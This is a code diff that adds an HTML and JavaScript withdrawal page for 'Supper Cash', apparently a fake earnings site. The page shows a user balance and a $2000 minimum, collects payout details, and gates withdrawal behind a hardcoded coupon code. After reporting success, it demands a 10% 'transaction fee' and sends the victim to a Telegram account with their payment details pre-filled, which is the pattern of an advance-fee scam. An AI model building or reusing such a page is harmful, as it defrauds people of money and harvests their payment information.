@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Withdraw Funds - Supper Cash</title>
+<style>
+  :root {
+    --primary: #FF6B35;
+    --primary-dark: #E55A2B;
+    --secondary: #004E89;
+    --accent: #FFD166;
+    --light: #F8F9FA;
+    --dark: #212529;
+    --success: #06D6A0;
+    --gray: #6C757D;
+    --shadow: 0 4px 12px rgba(0,0,0,0.1);
+  }
+  
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+    color: var(--dark);
+    line-height: 1.6;
+    min-height: 100vh;
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+  
+  .container {
+    max-width: 600px;
+    width: 100%;
+  }
+  
+  .header {
+    text-align: center;
+    margin-bottom: 30px;
+  }
+  
+  .logo {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 15px;
+    margin-bottom: 20px;
+  }
+  
+  .logo-icon {
+    width: 50px;
+    height: 50px;
+    background: var(--accent);
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+    font-size: 24px;
+    color: var(--primary-dark);
+    box-shadow: var(--shadow);
+  }
+  
+  .logo-text {
+    font-size: 2.2em;
+    font-weight: 800;
+    color: var(--secondary);
+    letter-spacing: 1px;
+  }
+  
+  .page-title {
+    font-size: 2.2em;
+    margin-bottom: 10px;
+    color: var(--secondary);
+    font-weight: 700;
+  }
+  
+  .subtitle {
+    font-size: 1.1em;
+    color: var(--gray);
+    margin-bottom: 30px;
+  }
+  
+  .form-container {
+    background: white;
+    border-radius: 16px;
+    padding: 40px;
+    box-shadow: var(--shadow);
+    margin-bottom: 30px;
+  }
+  
+  .welcome-message {
+    text-align: center;
+    font-size: 1.2em;
+    font-weight: 600;
+    margin-bottom: 25px;
+    color: var(--primary);
+    padding: 15px;
+    background: rgba(255, 107, 53, 0.1);
+    border-radius: 10px;
+  }
+  
+  .note-box {
+    background: rgba(255, 214, 102, 0.2);
+    border-left: 4px solid var(--accent);
+    padding: 15px;
+    border-radius: 8px;
+    margin-bottom: 25px;
+    font-weight: 600;
+    color: var(--dark);
+  }
+  
+  .form-group {
+    margin-bottom: 25px;
+  }
+  
+  label {
+    display: block;
+    margin-bottom: 8px;
+    font-weight: 600;
+    color: var(--secondary);
+  }
+  
+  input, select {
+    width: 100%;
+    padding: 14px;
+    border: 2px solid #e1e5ee;
+    border-radius: 8px;
+    font-size: 1em;
+    transition: border 0.3s ease;
+  }
+  
+  input:focus, select:focus {
+    border-color: var(--primary);
+    outline: none;
+  }
+  
+  .btn {
+    padding: 16px;
+    font-size: 1.2em;
+    border: none;
+    border-radius: 10px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    width: 100%;
+    box-shadow: var(--shadow);
+    text-align: center;
+    text-decoration: none;
+    display: block;
+  }
+  
+  .btn-primary {
+    background: linear-gradient(to right, var(--primary), var(--primary-dark));
+    color: white;
+  }
+  
+  .btn-primary:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 8px 20px rgba(255, 107, 53, 0.4);
+  }
+  
+  .btn-secondary {
+    background: white;
+    color: var(--secondary);
+    border: 2px solid var(--secondary);
+    margin-top: 15px;
+  }
+  
+  .btn-secondary:hover {
+    background: var(--secondary);
+    color: white;
+  }
+  
+  .hidden {
+    display: none;
+  }
+  
+  .message {
+    padding: 15px;
+    margin-top: 20px;
+    border-radius: 8px;
+    font-weight: 600;
+    text-align: center;
+  }
+  
+  .error {
+    background: rgba(220, 53, 69, 0.1);
+    color: #dc3545;
+    border-left: 4px solid #dc3545;
+  }
+  
+  .success {
+    background: rgba(25, 135, 84, 0.1);
+    color: #198754;
+    border-left: 4px solid #198754;
+  }
+  
+  .fee-section {
+    background: rgba(0, 78, 137, 0.1);
+    border-radius: 12px;
+    padding: 25px;
+    margin-top: 25px;
+    border-left: 4px solid var(--secondary);
+    text-align: center;
+  }
+  
+  .fee-section h3 {
+    color: var(--secondary);
+    margin-bottom: 15px;
+    font-size: 1.3em;
+  }
+  
+  footer {
+    background: var(--dark);
+    color: white;
+    padding: 30px 0;
+    text-align: center;
+    margin-top: 50px;
+    width: 100%;
+    border-radius: 16px;
+  }
+  
+  .footer-links {
+    display: flex;
+    justify-content: center;
+    gap: 25px;
+    margin: 20px 0;
+    flex-wrap: wrap;
+  }
+  
+  .footer-links a {
+    color: #ddd;
+    text-decoration: none;
+    transition: color 0.3s ease;
+  }
+  
+  .footer-links a:hover {
+    color: var(--accent);
+  }
+  
+  .copyright {
+    margin-top: 20px;
+    color: #aaa;
+    font-size: 0.9em;
+  }
+  
+  @media (max-width: 768px) {
+    .page-title {
+      font-size: 1.8em;
+    }
+    
+    .form-container {
+      padding: 30px 20px;
+    }
+    
+    .logo-text {
+      font-size: 1.8em;
+    }
+    
+    .footer-links {
+      flex-direction: column;
+      gap: 10px;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <div class="logo">
+      <div class="logo-icon">$</div>
+      <div class="logo-text">Supper Cash</div>
+    </div>
+    <h1 class="page-title">Withdraw Funds</h1>
+    <p class="subtitle">Transfer your earnings to your preferred payment method</p>
+  </div>
+
+  <div class="form-container">
+    <div class="welcome-message" id="welcomeMessage">Welcome! Ready to withdraw your funds.</div>
+    
+    <div class="note-box">
+      <strong>Note:</strong> Withdrawals are paid in <strong>USD</strong>. Minimum amount is $2000.
+    </div>
+
+    <form id="withdrawForm">
+      <div class="form-group">
+        <label for="amount">Amount to Withdraw ($):</label>
+        <input type="number" id="amount" name="amount" required min="2000" step="0.01" placeholder="Enter amount in USD" />
+      </div>
+
+      <div class="form-group">
+        <label for="paymentType">Choose Payment Method:</label>
+        <select id="paymentType" name="paymentType" required>
+          <option value="" disabled selected>Select Payment Method</option>
+          <option>PayPal</option>
+          <option>Zelle</option>
+          <option>Cash App</option>
+          <option>Bitcoin</option>
+          <option>Ethereum</option>
+          <option>USDT</option>
+          <option>Litecoin</option>
+          <option>Dogecoin</option>
+          <option>Ripple (XRP)</option>
+          <option>Chime</option>
+          <option>Apple Pay</option>
+          <option>Google Pay</option>
+          <option>Venmo</option>
+          <option>Bank Wire</option>
+          <option>Wise</option>
+          <option>Revolut</option>
+          <option>Payoneer</option>
+          <option>Skrill</option>
+          <option>N26</option>
+          <option>Alipay</option>
+        </select>
+      </div>
+
+      <div id="detailWrapper" class="form-group hidden">
+        <label id="detailLabel" for="paymentDetail"></label>
+        <input type="text" id="paymentDetail" name="paymentDetail" required />
+      </div>
+
+      <!-- coupon HIDDEN until requested -->
+      <div id="couponWrapper" class="form-group hidden">
+        <label for="coupon">Withdrawal Coupon:</label>
+        <input type="text" id="coupon" name="coupon" placeholder="Enter withdrawal coupon" />
+      </div>
+
+      <button type="submit" class="btn btn-primary" id="sendBtn">Process Withdrawal</button>
+    </form>
+
+    <!-- messages -->
+    <div id="msg" class="message hidden"></div>
+
+    <!-- fee + approve -->
+    <div id="feeSection" class="fee-section hidden">
+      <h3>Transaction Fee Required</h3>
+      <p>You must pay a <strong>10% transaction fee</strong> to approve this withdrawal.</p>
+      <button id="approveBtn" class="btn btn-primary">Approve & Open Telegram</button>
+    </div>
+  </div>
+
+  <a href="dashboard.html" class="btn btn-secondary">Back to Dashboard</a>
+
+  <footer>
+    <div class="container">
+      <p>Fast and secure withdrawals with Supper Cash</p>
+      <div class="footer-links">
+        <a href="/privacy.html">Privacy Policy</a>
+        <a href="/terms.html">Terms of Service</a>
+        <a href="/faq.html">FAQ</a>
+        <a href="/contact.html">Contact</a>
+      </div>
+      <div class="copyright">
+        &copy; 2023 Supper Cash. All rights reserved.
+      </div>
+    </div>
+  </footer>
+</div>
+
+<script>
+const paymentType = document.getElementById("paymentType");
+const detailWrapper = document.getElementById("detailWrapper");
+const detailLabel = document.getElementById("detailLabel");
+const detailInput = document.getElementById("paymentDetail");
+const couponWrapper = document.getElementById("couponWrapper");
+const msg = document.getElementById("msg");
+const feeSection = document.getElementById("feeSection");
+const approveBtn = document.getElementById("approveBtn");
+
+const labelMap = {
+  PayPal: "PayPal email address",
+  Zelle: "Zelle-linked email/phone",
+  "Cash App": "$Cashtag",
+  Bitcoin: "BTC wallet address",
+  Ethereum: "ETH wallet address",
+  USDT: "USDT (TRC20/ERC20) address",
+  Litecoin: "LTC wallet address",
+  Dogecoin: "DOGE address",
+  "Ripple (XRP)": "XRP address + tag",
+  Chime: "Chime username",
+  "Apple Pay": "iMessage phone/email",
+  "Google Pay": "Google Pay address",
+  Venmo: "@Venmo handle",
+  "Bank Wire": "IBAN / Account #",
+  Wise: "Wise email",
+  Revolut: "Revolut username",
+  Payoneer: "Payoneer email",
+  Skrill: "Skrill email",
+  N26: "N26 IBAN",
+  Alipay: "Alipay ID"
+};
+
+paymentType.addEventListener("change", () => {
+  const selected = paymentType.value;
+  if (selected) {
+    detailLabel.textContent = `${labelMap[selected] || "Payment details"}:`;
+    detailInput.placeholder = labelMap[selected] || "";
+    detailWrapper.classList.remove("hidden");
+    detailInput.required = true;
+  } else {
+    detailWrapper.classList.add("hidden");
+    detailInput.required = false;
+    detailInput.value = "";
+  }
+});
+
+function showMsg(text, ok) {
+  msg.textContent = text;
+  msg.className = `message ${ok ? "success" : "error"}`;
+  msg.classList.remove("hidden");
+}
+
+async function loadUserBalance() {
+  try {
+    const response = await fetch('/user-info');
+    if (response.status === 401) {
+      showMsg("Please log in first.", false);
+      return null;
+    }
+    const data = await response.json();
+    document.getElementById("welcomeMessage").textContent = `Welcome ${data.fullName}! Your balance: $${data.balance.toFixed(2)}`;
+    return data.balance;
+  } catch {
+    showMsg("Unable to load user info.", false);
+    return null;
+  }
+}
+
+let currentBalance = 0;
+loadUserBalance().then(b => currentBalance = b ?? 0);
+
+document.getElementById("withdrawForm").addEventListener("submit", async e => {
+  e.preventDefault();
+  msg.classList.add("hidden");
+  const amount = parseFloat(document.getElementById("amount").value);
+  
+  if (amount < 2000) {
+    showMsg("Minimum withdrawal amount is $2000.", false);
+    return;
+  }
+  
+  if (amount > currentBalance) {
+    showMsg("Insufficient balance.", false);
+    return;
+  }
+  
+  if (!paymentType.value) {
+    showMsg("Please select a payment method.", false);
+    return;
+  }
+  
+  if (!detailInput.value.trim()) {
+    showMsg("Please enter your payment details.", false);
+    return;
+  }
+
+  // If coupon not yet asked, reveal it and stop here
+  if (couponWrapper.classList.contains("hidden")) {
+    couponWrapper.classList.remove("hidden");
+    showMsg("Enter your withdrawal coupon to proceed.", false);
+    return;
+  }
+
+  const coupon = document.getElementById("coupon").value.trim();
+  if (coupon !== "IWOKOLODAMI170") {
+    showMsg("Invalid coupon code. Please try again.", false);
+    return;
+  }
+
+  try {
+    const res = await fetch('/withdraw', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({ amount: amount.toString() })
+    });
+    
+    const text = await res.text();
+    if (!res.ok) {
+      showMsg(text || "Withdrawal failed. Please try again.", false);
+      return;
+    }
+    
+    showMsg("Withdrawal successful! Please pay the 10% fee to complete approval.", true);
+    feeSection.classList.remove("hidden");
+  } catch {
+    showMsg("Network error, please try again later.", false);
+  }
+});
+
+approveBtn.addEventListener("click", () => {
+  const amount = document.getElementById("amount").value;
+  const payMethod = paymentType.value;
+  const payDetails = detailInput.value.trim();
+  const fee = (amount * 0.10).toFixed(2);
+  const txt = encodeURIComponent(
+    `Hello SUPPER CASH OFFICIAL!\n` +
+    `I have withdrawn $${amount} via ${payMethod}.\n` +
+    `Payment details: ${payDetails}\n` +
+    `My 10% fee is $${fee}. Please send payment instructions so I can pay and approve my transaction.`
+  );
+  window.open(`https://t.me/Deluxcashearning/url?url=&text=${txt}`, '_blank');
+});
+</script>
+
+</body>
+</html>
